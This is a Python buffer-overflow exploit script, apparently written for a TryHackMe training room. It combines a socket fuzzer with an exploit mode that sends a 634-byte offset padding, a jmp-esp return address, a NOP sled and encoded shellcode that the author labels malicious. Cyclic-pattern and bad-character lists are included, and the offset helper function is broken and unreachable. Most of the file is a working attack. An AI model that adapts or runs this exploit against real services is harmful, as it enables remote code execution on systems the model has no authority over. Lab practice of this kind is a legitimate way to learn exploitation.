##################################################
##@jockmedlinux @ 2023-01-08					##
##################################################
import os,sys,subprocess,socket,argparse,time
parser = argparse.ArgumentParser(description='Easy script for buffer overflow by @jockemedlinux')
parser.add_argument('-F', action='store_true', help='Fuzz the application')
parser.add_argument('-B', action='store_true', help='Send the buffer')
parser.add_argument('-O', action='store_true', default='', help='Find the offset', required=False)
parser.add_argument('-C', action='store_true', default='', help='Check for bad characters', required=False)
parser.add_argument('-H', type=str, default='127.0.0.1', help='Host "IP"', required=False)
parser.add_argument('-P', type=int, default='1337', help='Port', required=False)

args = parser.parse_args()

# // fun stuff.
cowsending = subprocess.getoutput("echo 'Sending beezneez:::' | cowsay")
cowsent = subprocess.getoutput("echo ':::Beezneez sent' | cowsay")
cowfail	= subprocess.getoutput("echo 'Is it even running, guy?' | cowsay")
cowquit	= subprocess.getoutput("echo 'Quitter..' | cowsay -d")
cowprofit = subprocess.getoutput("echo 'Did we get it?' | cowsay -e '0o'")
timeout = 5

# // Tinker variables
prefix = "OVERFLOW3 "		#Special prefix for THM
offset = 634 					#Found offset
As = "A" * offset			#Overflow
Bs = "\xAF\x11\x50\x62"		#returnaddress (jmp-esp or push-esp) Save input here. [ADDRESS:"625011AF" | LE: "\xAF\x11\x50\x62"]
nops = "\x90" * 16
nullbyte = ""

# // Cyclic brakepoint.[SAVE INPUT HERE| ADDRESS:"764131EC" | LE: "xEC\x31\x41\x76" ]
cyclic = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba"
badchars = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"

#// Malicious shellcode to run. (if not using buf as above)
#identified bad characters here --> [ \x00\x23\x3c\x83\xa0     ]
shellcode = (
"\xfc\xbb\x48\x81\xd0\x24\xeb\x0c\x5e\x56\x31\x1e\xad\x01"
"\xc3\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\xb4\x69\x52"
"\x24\x44\x6a\x33\xac\xa1\x5b\x73\xca\xa2\xcc\x43\x98\xe6"
"\xe0\x28\xcc\x12\x72\x5c\xd9\x15\x33\xeb\x3f\x18\xc4\x40"
"\x03\x3b\x46\x9b\x50\x9b\x77\x54\xa5\xda\xb0\x89\x44\x8e"
"\x69\xc5\xfb\x3e\x1d\x93\xc7\xb5\x6d\x35\x40\x2a\x25\x34"
"\x61\xfd\x3d\x6f\xa1\xfc\x92\x1b\xe8\xe6\xf7\x26\xa2\x9d"
"\xcc\xdd\x35\x77\x1d\x1d\x99\xb6\x91\xec\xe3\xff\x16\x0f"
"\x96\x09\x65\xb2\xa1\xce\x17\x68\x27\xd4\xb0\xfb\x9f\x30"
"\x40\x2f\x79\xb3\x4e\x84\x0d\x9b\x52\x1b\xc1\x90\x6f\x90"
"\xe4\x76\xe6\xe2\xc2\x52\xa2\xb1\x6b\xc3\x0e\x17\x93\x13"
"\xf1\xc8\x31\x58\x1c\x1c\x48\x03\x49\xd1\x61\xbb\x89\x7d"
"\xf1\xc8\xbb\x22\xa9\x46\xf0\xab\x77\x91\xf7\x81\xc0\x0d"
"\x06\x2a\x31\x04\xcd\x7e\x61\x3e\xe4\xfe\xea\xbe\x09\x2b"
"\xbc\xee\xa5\x84\x7d\x5e\x06\x75\x16\xb4\x89\xaa\x06\xb7"
"\x43\xc3\xad\x42\x04\xe6\x3f\x63\x05\x9e\x3d\x7b\xb4\x03"
"\xcb\x9d\xdc\xab\x9d\x36\x49\x55\x84\xcc\xe8\x9a\x12\xa9"
"\x2b\x10\x91\x4e\xe5\xd1\xdc\x5c\x92\x11\xab\x3e\x35\x2d"
"\x01\x56\xd9\xbc\xce\xa6\x94\xdc\x58\xf1\xf1\x13\x91\x97"
"\xef\x0a\x0b\x85\xed\xcb\x74\x0d\x2a\x28\x7a\x8c\xbf\x14"
"\x58\x9e\x79\x94\xe4\xca\xd5\xc3\xb2\xa4\x93\xbd\x74\x1e"
"\x4a\x11\xdf\xf6\x0b\x59\xe0\x80\x13\xb4\x96\x6c\xa5\x61"
"\xef\x93\x0a\xe6\xe7\xec\x76\x96\x08\x27\x33\xb6\xea\xed"
"\x4e\x5f\xb3\x64\xf3\x02\x44\x53\x30\x3b\xc7\x51\xc9\xb8"
"\xd7\x10\xcc\x85\x5f\xc9\xbc\x96\x35\xed\x13\x96\x1f\xed"
"\x93\x68\xa0"
)

# // THM Room specifics.
string = prefix + "A" * 100

# // The bufer
buffer = ""
buffer += prefix
buffer += As
buffer += Bs
#buffer += shellcode
buffer += nops
#buffer += cyclic
#buffer += badchars
buffer += shellcode

def close():
	print("\nProgram closing.")
	print(cowquit)
	sys.exit()
def crash():
	print(cowprofit)
	sys.exit()
def run():
	print(cowfail)
	sys.exit()
	#def offset():
	lenght = int(input("How many characters do you wanna create? "))
	pattern = cyclic(lenght)
	print("\nCreated string: ")
	print(pattern.decode())
	print("\n")
	find = input("What is the input you wanna search for? ")
	offset = cyclic_find(str(find), n=len(pattern))
	print(offset)
#def badchars():

def fuzzer():
	global prefix
	global string
	while True:
		try:
			with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
				#result = s.connect_ex((args.H, args.P))
				s.settimeout(timeout)
				s.connect((args.H, args.P))
				s.recv(1024)
				print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
				s.send(bytes(string, "latin-1"))
				s.recv(1024)
		except KeyboardInterrupt:
			close()
		except socket.gaierror as e:
			print(f'Error: {e}')
			run()
		except socket.error as e2:
			if len(string) - len(prefix) > 100:
				print(f'\nError:{e2}')
				print(f'You seem to have crashed it.\n')
				print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
				crash()
			else:
				print(f'Error: {e2}')
				run()
		except:
			print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
			crash()
		string += 100 * "A"

		
# // Buffer overflow
def main():
	global buffer
	global cowsending
	print(cowsending)
	print(buffer)
	try:
		with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
			s.settimeout(1)
			s.connect((args.H, args.P))
			s.recv(1024)
			s.send(bytes(buffer, "latin-1"))
			s.recv(1024)
	except KeyboardInterrupt:
		close()
	except:
		print(cowsent)

if args.F:
	fuzzer()
elif args.B:
	main()
#elif args.O:
#	offset()
#elif args.C:
	#badchars()
else:
	print("\033[1;31;40m \n##You need to use either the Fuzzer (-F) module, or the Buffer (-B) module##\n")
	print("\033[1;32;40m Bright Green \n")
	parser.print_help()	